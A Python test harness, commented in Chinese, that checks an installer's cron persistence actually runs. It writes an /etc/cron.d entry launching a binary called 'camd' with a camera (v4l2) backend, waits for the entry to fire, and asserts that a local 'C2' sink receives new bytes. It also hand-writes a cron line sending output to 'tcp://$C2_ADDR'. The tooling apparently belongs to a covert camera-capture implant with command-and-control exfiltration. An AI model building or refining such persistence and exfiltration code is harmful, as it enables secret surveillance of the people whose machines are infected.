#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
cron 驻留"真的会执行"的端到端守卫。

要证的事
--------
onekey.sh 的 persist_cron 只会写条目 + 探测守护进程。此前本环境**没有任何
cron 守护进程**（cron/crond/busybox 全无，且无外网装不上），所以那一行
"cron 条目已写入" 从未被证明过真的会跑。这个守卫补上"执行"这一半：
按真实 cron.d 语义解析条目 → 等到条目自己的时刻 → 真实 sh -c 执行 →
断言 C2 真的收到了字节。

为什么必须对齐时刻再装
----------------------
条目的分位 M = 安装时刻的秒数，因此下一次触发在"分钟 == M"时。
若任意时刻安装，最长要等 59 分钟。本守卫刻意等到 秒 == (分+1) mod 60
再安装，把等待压到 60 秒以内 —— 不改条目、不改调度语义，只挑安装时机。

判据
----
  P1 解析器自检通过
  P2 对齐后安装，条目的下一次触发真实发生（harness 报告 FIRED）
  P3 C2 在触发后**新增**字节（install 自身的试运行字节已计入基线，不算）
  P4 执行日志里 camd 退出码为 0，且没有 "必须指定 --key"
  R1 反向：把条目退回缺陷写法（. conf 但不导出）→ 立即执行必须失败，
     且 C2 不新增字节 —— 证明 P3/P4 不是恒绿
"""

import re
import json
import os
import shutil
import subprocess
import sys
import time
from datetime import datetime


def _default_name(tpl):
    m = re.search(r'^NAME="\$\{NAME:-([^}]+)\}"',
                  open(tpl, encoding="utf-8").read(), re.M)
    if not m:
        raise SystemExit("[FATAL] 无法从模板解析默认 NAME——"
                         "守卫会按旧名找落点，失配方向是假阴性（恒绿）")
    return m.group(1)

CRONF = None  # 占位，下面紧随 DEFN 赋值
DEFN = _default_name(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "onekey.sh"))
CRONF = "/etc/cron.d/" + DEFN


HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(HERE)
ROOT = os.path.dirname(REPO)
WORK = "/data/cron_exec_test"
LOG = "/data/cron_exec_test/harness.log"

PASS, FAIL = [], []


def ck(cond, name, detail=""):
    (PASS if cond else FAIL).append(name)
    print("[%s] %s%s" % ("PASS" if cond else "FAIL", name,
                         ("  -- " + detail) if detail else ""))


def sh(cmd, **kw):
    return subprocess.run(cmd, shell=True, capture_output=True,
                          text=True, **kw)


def free_port():
    import socket
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def c2_bytes(stats):
    try:
        with open(stats) as f:
            return json.load(f).get("total_bytes", 0)
    except Exception:
        return 0


def wait_align():
    """等到 (秒 == (分+1) mod 60)，使条目在 60 秒内必然触发。"""
    while True:
        now = datetime.now()
        if now.second == (now.minute + 1) % 60:
            return
        time.sleep(0.3)


def main():
    shutil.rmtree(WORK, ignore_errors=True)
    # 收端输出目录必须自己建：c2_sink.py 不会创建，目录缺失时它直接退出。
    # 上一版漏了这一步，收端死亡却被伪装成 "camd 回传失败(-4)" —— 与上一轮
    # tls sink 那次是同一类失效：工具死了，症状却指向被测代码。
    os.makedirs(os.path.join(WORK, "inbox"), exist_ok=True)
    for p in (LOG, CRONF):
        try:
            os.remove(p)
        except OSError:
            pass

    harness = os.path.join(HERE, "crond_harness.py")

    # P1 解析器自检
    r = sh("python3 %s --check-parser" % harness)
    ck(r.returncode == 0, "P1 解析器自检（含非法输入与日/周或语义）")

    # 生成一键脚本（用当前 onekey.sh，避免拿旧产物验证新代码）
    r = sh("cd %s && python3 %s %s amd64"
           % (ROOT, os.path.join(REPO, "make_onekey.py"),
              os.path.join(ROOT, "agent_windows/build/linux/camd")))
    onekey = os.path.join(REPO, "onekey-amd64.sh")
    ck(r.returncode == 0 and os.path.isfile(onekey),
       "P0 一键脚本已生成", r.stderr.strip()[-200:])

    # 起 C2
    port = free_port()
    stats = os.path.join(WORK, "stats.json")
    sink = subprocess.Popen(
        ["python3", os.path.join(REPO, "c2_sink.py"),
         "--port", str(port), "--out", os.path.join(WORK, "inbox"),
         "--stats", stats, "--log", os.path.join(WORK, "sink.log")],
        stdout=open(os.path.join(WORK, "sink_std.log"), "w"),
        stderr=subprocess.STDOUT, start_new_session=True)
    time.sleep(2)
    # 收端存活硬断言：不加这条，收端任何死法都会被记成 "没收到字节"，
    # 排查方向被引到被测代码上。
    import socket as _sk
    alive = sink.poll() is None
    listening = False
    try:
        c = _sk.create_connection(("127.0.0.1", port), 2); c.close(); listening = True
    except OSError:
        pass
    if not (alive and listening):
        detail = ""
        try:
            detail = open(os.path.join(WORK, "sink_std.log")).read()[:400]
        except OSError:
            pass
        ck(False, "P0b 收端存活", "alive=%s listening=%s %s"
           % (alive, listening, detail))
        return 1
    ck(True, "P0b 收端存活且端口可达", "port=%d" % port)

    # 对齐后安装
    wait_align()
    r = sh("sh %s --c2 127.0.0.1:%d --backend v4l2" % (onekey, port),
           timeout=180)
    inst_ok = ("cron 条目已写入" in r.stdout)
    ck(inst_ok, "P2a 安装写出 cron 条目",
       " | ".join(l.strip() for l in r.stdout.splitlines() if "cron" in l))
    if not os.path.isfile(CRONF):
        ck(False, "P2a 安装写出 cron 条目", "文件不存在")
        sink.terminate()
        return 1
    entry = open(CRONF).read()
    print("      条目: %s" % entry.strip().replace("\n", " | "))

    base = c2_bytes(stats)
    print("      基线字节（install 试运行已计入，不算进触发）: %d" % base)

    # 等条目自己的时刻真实触发
    r = sh("python3 %s --file %s --serve 180 --stop-after 1 --log %s"
           % (harness, CRONF, LOG), timeout=220)
    fired = "FIRED" in r.stdout
    ck(fired, "P2b 条目在自身时刻被真实触发", r.stdout.strip()[:200])

    time.sleep(2)
    after = c2_bytes(stats)
    ck(after > base, "P3 C2 在触发后新增字节（cron 真的在采）",
       "base=%d after=%d" % (base, after))

    logtxt = open(LOG).read() if os.path.isfile(LOG) else ""
    ck("exit=0" in logtxt, "P4a camd 退出码 0")
    ck("必须指定" not in logtxt, "P4b 日志无 '必须指定 --key'")

    # R1 反向：退回缺陷写法（. conf 但不导出）→ 必须失败且不产出
    conf = "/etc/%s/%s.conf" % (DEFN, DEFN)
    if os.path.isfile(conf):
        before_r = c2_bytes(stats)
        with open(CRONF, "w") as f:
            f.write("# managed\nSHELL=/bin/sh\n")
            f.write("PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:"
                    "/usr/sbin:/usr/bin\n")
            # 5 个时间字段 + user + command。第一版我只写了 4 个星号，
            # 条目根本解析不过（dow 字段拿到 "root"），harness 直接报
            # ValueError —— 反向用例**没有真正跑到**，却因为 rc!=0 看起来
            # 像"失败了"。这正是"注入没生效"最典型的伪装。
            f.write(("0 * * * * root . %s; /usr/local/bin/" % conf)
                    + DEFN
                    + ' --sink "tcp://$C2_ADDR" --backend "'
                      '$CAMD_BACKEND"\n')
        r2 = sh("python3 %s --file %s --once --log %s"
                % (harness, CRONF, LOG), timeout=90)
        time.sleep(1)
        ck(r2.returncode != 0 and "必须指定" in open(LOG).read(),
           "R1 反向：缺陷写法下 camd 必报缺密钥",
           "rc=%d out=%s err=%s" % (r2.returncode,
                                    r2.stdout.strip()[:200],
                                    r2.stderr.strip()[:200]))
        ck(c2_bytes(stats) == before_r,
           "R1b 反向：缺陷写法下 C2 不新增字节",
           "before=%d after=%d" % (before_r, c2_bytes(stats)))
    else:
        ck(False, "R1 反向", "conf 不存在，无法构造")

    # 清理
    sh("sh %s uninstall" % onekey, timeout=120)
    sink.terminate()
    leftover = [p for p in ("/etc/cron.d/" + DEFN, "/usr/local/bin/" + DEFN,
                            "/etc/%s/%s.conf" % (DEFN, DEFN)) if os.path.exists(p)]
    ck(not leftover, "P5 卸载无残留", str(leftover))

    print("\n=== result: %d pass, %d fail ===" % (len(PASS), len(FAIL)))
    for f in FAIL:
        print("  [FAIL] %s" % f)
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
